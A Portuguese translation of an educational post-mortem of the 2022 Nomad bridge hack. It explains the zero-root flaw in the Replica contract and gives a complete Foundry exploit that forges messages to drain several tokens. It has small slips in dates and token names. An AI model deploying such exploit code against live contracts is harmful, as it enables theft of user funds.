# Depuração de Transações OnChain: 7. Análise do Evento de Ponte Nomad (2022/08)

Autor: [gmhacker.eth](https://twitter.com/realgmhacker)

Tradução: [Spark](https://twitter.com/SparkToday00)

## Visão Geral do Evento (Introdução)
Em 1º de agosto de 2022, a Ponte Nomad foi alvo de um ataque hacker. Um total de US$ 190 milhões em ativos bloqueados foram roubados durante o incidente. Após o sucesso do primeiro hacker, muitos outros viajantes da Floresta Negra se juntaram aos ataques de imitação, resultando em um grave incidente de segurança com múltiplas fontes de ataque.

A causa fundamental foi uma atualização de rotina em um contrato de proxy da Nomad, que marcou um valor de hash zero como uma raiz confiável, permitindo que qualquer mensagem fosse automaticamente comprovada. O hacker explorou essa vulnerabilidade para enganar o contrato da ponte e desbloquear os fundos. A primeira [transação de ataque](https://dashboard.tenderly.co/tx/mainnet/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460) lucrou 100 WBTC, equivalente a cerca de US$ 2,3 milhões.

Neste ataque, o invasor não precisava de empréstimos relâmpago ou interações complexas com outros protocolos DeFi. O processo de ataque envolveu apenas a chamada de uma função em um contrato e o lançamento de um ataque à liquidez do protocolo com a entrada correta da mensagem. A simplicidade e a capacidade de reprodução da transação de ataque levaram outras pessoas a coletar parte dos lucros ilegais, tornando o evento ainda pior.

Como mencionado pela [Rekt News](https://rekt.news/nomad-rekt/), "como é o jogo no DeFi, este ataque hacker foi quase sem barreiras, qualquer um poderia entrar".

## Contexto (Antecedentes)
A Nomad é uma aplicação de interação entre cadeias que permite operações de tokens entre Ethereum, Moonbeam e outras cadeias. As mensagens enviadas ao contrato da Nomad são verificadas e transmitidas para outras cadeias por meio de um mecanismo de proxy offline, seguindo o mecanismo de verificação otimista.

Como a maioria dos protocolos de ponte entre cadeias, a transferência de tokens da Nomad é realizada bloqueando os tokens de um lado e emitindo tokens do outro lado para concluir a transferência de valor em cadeias diferentes. Esses tokens representativos podem ser queimados para desbloquear os fundos originais (ou seja, retornar os tokens para a cadeia nativa do token), atuando como promissórias com o mesmo valor econômico dos tokens ERC-20 originais. Por causa disso, os projetos de ponte entre cadeias acumulam uma grande quantidade de fundos em contratos inteligentes complexos, tornando-os alvos atraentes para hackers.

![](https://miro.medium.com/v2/resize:fit:1400/0*-reF-Ys6qVUWwnfJ)
Processo de bloqueio e emissão de tokens de ponte entre cadeias, referência: [Blog MakerDAO](https://blog.makerdao.com/what-are-blockchain-bridges-and-why-are-they-important-for-defi/)

No projeto Nomad, um contrato chamado **Replica** é usado para verificar as mensagens em uma estrutura de árvore de Merkle, que é implantada em várias cadeias. Os outros contratos do projeto dependem desse contrato para verificar as mensagens de entrada. Uma vez que uma mensagem é verificada, ela é armazenada na árvore de Merkle e gera uma nova raiz de árvore, que é posteriormente confirmada e processada.

## Causa Fundamental (Causa Raiz)
Agora que temos uma compreensão geral da Ponte Nomad, podemos mergulhar no código real do contrato inteligente para explorar a causa fundamental do ataque hacker de agosto de 2022. Para fazer isso, precisamos entender em detalhes o contrato **Replica**.

*Trecho de código do contrato Replica.sol `process` [aqui](https://gist.github.com/gists-immunefi/f8ef00be9e1c5dd4d879a418966191e0/raw/8fb8fd808b59eca9ca51df98aef65d7ce4c805e6/Nomad%20Hack%20Analysis%201.sol)*

```solidity=
function process(bytes memory _message) public returns (bool _success) {
    // ensure message was meant for this domain
    bytes29 _m = _message.ref(0);
    require(_m.destination() == localDomain, "!destination");
    // ensure message has been proven
    bytes32 _messageHash = _m.keccak();
    require(acceptableRoot(messages[_messageHash]), "!proven");
    // check re-entrancy guard
    require(entered == 1, "!reentrant");
    entered = 0;
    // update message status as processed
    messages[_messageHash] = LEGACY_STATUS_PROCESSED;
    // call handle function
    IMessageRecipient(_m.recipientAddress()).handle(
        _m.origin(),
        _m.nonce(),
        _m.sender(),
        _m.body().clone()
    );
    // emit process results
    emit Process(_messageHash, true, "");
    // reset re-entrancy guard
    entered = 1;
    // return true
    return true;
}
```


A função `process` no contrato Replica é responsável por enviar a mensagem para o destinatário final. A função só será executada com sucesso se a mensagem de entrada for verificada, o que significa que a mensagem foi adicionada à árvore de Merkle antes de chamar o `process`. A verificação (linha 36) é feita consultando o valor de hash da mensagem de entrada no mapeamento de raízes verificadas (`acceptableRoot`).

*Trecho de código do contrato Replica.sol `initialize` [aqui](https://gist.github.com/gists-immunefi/4792c4bb10d3f73648b4b0f86e564ac9/raw/1f70cc5490bf2383d42eeec3fa06a74d7be1a66c/Nomad%20Hack%20Analysis%202.sol)*
```solidity=
function initialize(
    uint32 _remoteDomain,
    address _updater,
    bytes32 _committedRoot,
    uint256 _optimisticSeconds
) public initializer {
    __NomadBase_initialize(_updater);
    // set storage variables
    entered = 1;
    remoteDomain = _remoteDomain;
    committedRoot = _committedRoot;
    // pre-approve the committed root.
    confirmAt[_committedRoot] = 1;
    _setOptimisticTimeout(_optimisticSeconds);
}
```



Ao atualizar a implementação do contrato de proxy, a implementação do contrato é inicializada uma vez com uma função de inicialização que define alguns valores de estado iniciais. Podemos ver que em 21 de junho, uma nova implementação do contrato Nomad foi implantada e, em seguida, a função de inicialização foi chamada em uma [transação](https://etherscan.io/tx/0x53fd92771d2084a9bf39a6477015ef53b7f116c79d98a21be723d06d79024cad) posterior para inicializar o contrato de implementação. Por fim, houve uma atualização de rotina no contrato que armazena o endereço da implementação do contrato, conforme mostrado nesta [transação](https://etherscan.io/tx/0x7bccd64f4c4d5f6f545c2edf904857e6ddb460532fc0ac7eb5ac175cd21e56b1). Durante a chamada da função de inicialização, o valor 0x00 foi definido como uma raiz pré-aprovada e armazenado no mapeamento `confirmAt`, que foi o ponto de partida para este evento.

Voltando à função `process`, podemos ver que o processo de verificação depende da verificação do valor de hash da mensagem no mapeamento de mensagens e marca a mensagem como processada, para que o invasor não possa reutilizar a mesma mensagem.

Vale ressaltar que, no armazenamento de contratos inteligentes da EVM, todas as posições (slots) têm um valor inicial de 0, o que significa que, ao ler uma posição de armazenamento não utilizada, a EVM sempre retornará um valor zero (0x00) em vez de um erro. Da mesma forma, para mapeamentos, quando uma chave de mapeamento inexistente é consultada, um valor zero é retornado, que é passado para a função `acceptableRoot`. Devido à atualização em 21 de abril, onde 0x00 foi definido como uma raiz confiável, essa função retornará verdadeiro. Em seguida, a mensagem é marcada como processada, mas qualquer pessoa pode gerar uma nova mensagem simplesmente alterando o conteúdo da mensagem e realizar ataques de imitação.

As mensagens de entrada geralmente são codificadas com vários tipos de parâmetros. Para mensagens que desbloqueiam fundos da ponte, um dos parâmetros é o endereço do destinatário. Portanto, após o primeiro ataque bem-sucedido realizado por um [atacante](https://dashboard.tenderly.co/tx/mainnet/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460), qualquer pessoa que entenda a decodificação da mensagem pode simplesmente alterar o endereço do destinatário e realizar ataques de imitação adicionais, pois são usadas mensagens diferentes e, portanto, os novos ataques não são afetados pelos ataques anteriores, permitindo que os novos endereços obtenham lucros.

## Reprodução do Ataque (Prova de Conceito)
Agora que entendemos por que a Nomad foi atacada, é hora de tentar reproduzir o ataque. Vamos criar mensagens de ataque para diferentes tokens com base nos saldos correspondentes na ponte e usá-las como entrada para a função `process` no contrato Replica para roubar os ativos.

Aqui, usaremos um serviço RPC com recursos de arquivamento, como o [serviço gratuito da Ankr](https://www.ankr.com/rpc/eth/), para copiar o estado no bloco 15259100 (um bloco antes do ataque).

Nosso ataque reproduzirá os seguintes passos:
1. Escolher um token ERC-20 específico e verificar o saldo do contrato da ponte Nomad ERC-20.
2. Gerar uma mensagem com os parâmetros corretos para desbloquear os fundos, usando o endereço do atacante como destinatário e o saldo total do token como a quantidade de fundos a serem desbloqueados.
3. Chamar a função `process` para obter o token.
4. Repetir os passos acima para diferentes tokens e roubar os fundos.

A seguir, usaremos o Foundry para concluir a reprodução do ataque.

## Ataque (O Ataque)

*[Contrato de ataque inicial](https://gist.githubusercontent.com/gists-immunefi/4305df38623ddcaa11812a9c186c73ac/raw/e960b16512343fb3d6f3d8821486e7fb1452952c/Nomad%20Hack%20Analysis%203.sol)*
```solidity
pragma solidity ^0.8.13;
 
import "@openzeppelin/token/ERC20/ERC20.sol";
 
interface IReplica {
   function process(bytes memory _message) external returns (bool _success);
}
 
contract Attacker {
   address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
   address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
 
   // tokens
   address [] public tokens = [
       0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
       0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
       0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
       0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
       0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
       0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
   ];
 
   function attack() external {
       for (uint i = 0; i < tokens.length; i++) {
           address token = tokens[i];
           uint256 amount_bridge = IERC20(token).balanceOf(ERC20_BRIDGE);
 
           bytes memory payload = genPayload(msg.sender, token, amount_bridge);
           bool success = IReplica(REPLICA).process(payload);
           require(success, "Failed to process the payload");
       }
   }
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory) {}
}
```

A função de entrada do contrato de ataque é `attack`, que contém um loop simples para iterar sobre os saldos de diferentes tokens no endereço da ponte ERC20 (ERC20_BRIDGE). O ERC20_BRIDGE se refere ao contrato de ponte ERC20 da Nomad, que é o local onde os ativos bloqueados são armazenados.

Em seguida, com base no saldo, criamos uma mensagem para o ataque e a passamos como entrada para a função `process` do contrato Replica. Essa função enviará nossa mensagem falsa para o contrato de backend correspondente, desencadeando a solicitação de desbloqueio e transferência de ativos da ponte, colocando a ponte em nossas mãos.

*Gerando uma mensagem válida*
```solidity=
contract Attacker {
   address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
  
   // Nomad domain IDs
   uint32 constant ETHEREUM = 0x657468;   // "eth"
   uint32 constant MOONBEAM = 0x6265616d; // "beam"
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory payload) {
       payload = abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),            // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(recipient)),        // Recipient of the transfer
           uint256(amount),                    // Amount
           uint256(0)                          // Optional: Token details hash
                                               // keccak256(                 
                                               //     abi.encodePacked(
                                               //         bytes(tokenName).length,
                                               //         tokenName,
                                               //         bytes(tokenSymbol).length,
                                               //         tokenSymbol,
                                               //         tokenDecimals
                                               //     )
                                               // )
       );
   }
}
```

No processo de geração de mensagens, é importante codificar corretamente os diferentes parâmetros para garantir que o protocolo Nomad possa decodificá-los corretamente. Também precisamos especificar o caminho de roteamento para a mensagem - o contrato de roteamento da ponte e o endereço da ponte ERC20. Além disso, precisamos usar 0x3 como tipo para representar a transferência de token.

Por fim, precisamos determinar os parâmetros que nos trarão lucro - o endereço do token, a quantidade a ser transferida e o destinatário. Como mencionado anteriormente, isso criará informações completamente novas para o contrato Replica.

Incrivelmente, mesmo com algumas informações de log relacionadas ao Foundry, o código completo da PoC tem apenas 87 linhas. Executando o código de reprodução acima, podemos obter os seguintes fundos:

- 1.028 WBTC
- 22.876 WETH
- 87.459.362 USDC
- 8.625.217 USDT
- 4.533.633 DAI
- 119.088 FXS
- 113.403.733 CQT

## Conclusão

atento aos valores padrão dos slots de armazenamento, que são inicializados como zero. Especialmente ao lidar com mapeamentos, é importante definir testes unitários para evitar possíveis perigos relacionados a valores comuns que podem levar a vulnerabilidades.

Vale ressaltar que algumas contas envolvidas em ataques de imitação devolveram os fundos ao projeto Nomad, e o projeto está planejando [relançar](https://medium.com/nomad-xyz-blog/nomad-bridge-relaunch-guide-3a4ef6624f90) e devolver os ativos aos usuários afetados. Se você possui ativos perdidos no ataque à Nomad, por favor, devolva-os para a [carteira de recuperação da Nomad](https://etherscan.io/address/0x94a84433101a10aeda762968f6995c574d1bf154).

Como mencionado anteriormente, este ataque foi muito mais simples do que parece e é possível roubar todos os fundos em uma única transação. Abaixo está o código completo da PoC (incluindo alguns logs do Foundry):

*[Código completo da PoC](https://gist.githubusercontent.com/gists-immunefi/2bdffe6f9683c9b3ab810e1fb7fe4aff/raw/df16e8103c6c3b38d412e0320cda37da9a5a9e7c/Nomad%20Hack%20Analysis%205.sol)*
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
 
import "@openzeppelin/token/ERC20/ERC20.sol";
import "forge-std/console.sol";
 
interface IReplica {
   function process(bytes memory _message) external returns (bool _success);
}
 
contract Attacker {
   address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
   address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
   address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
  
   // Nomad domain IDs
   uint32 constant ETHEREUM = 0x657468;   // "eth"
   uint32 constant MOONBEAM = 0x6265616d; // "beam"
 
   // tokens
   address [] public tokens = [
       0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
       0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
       0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
       0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
       0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
       0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
   ];
 
   function attack() external {
       for (uint i = 0; i < tokens.length; i++) {
           address token = tokens[i];
           uint256 amount_bridge = ERC20(token).balanceOf(ERC20_BRIDGE);
 
           console.log(
               "[*] Stealing",
               amount_bridge / 10**ERC20(token).decimals(),
               ERC20(token).symbol()
           );
           console.log(
               "    Attacker balance before:",
               ERC20(token).balanceOf(msg.sender)
           );
 
           // Generate the payload with all of the tokens stored on the bridge
           bytes memory payload = genPayload(msg.sender, token, amount_bridge);
 
           bool success = IReplica(REPLICA).process(payload);
           require(success, "Failed to process the payload");
 
           console.log(
               "    Attacker balance after: ",
               IERC20(token).balanceOf(msg.sender) / 10**ERC20(token).decimals()
           );
       }
   }
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory payload) {
       payload = abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),          // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(recipient)),      // Recipient of the transfer
           uint256(amount),                  // Amount
           uint256(0)                          // Optional: Token details hash
                                               // keccak256(                 
                                               //     abi.encodePacked(
                                               //         bytes(tokenName).length,
                                               //         tokenName,
                                               //         bytes(tokenSymbol).length,
                                               //         tokenSymbol,
                                               //         tokenDecimals
                                               //     )
                                               // )
       );
   }
}
```

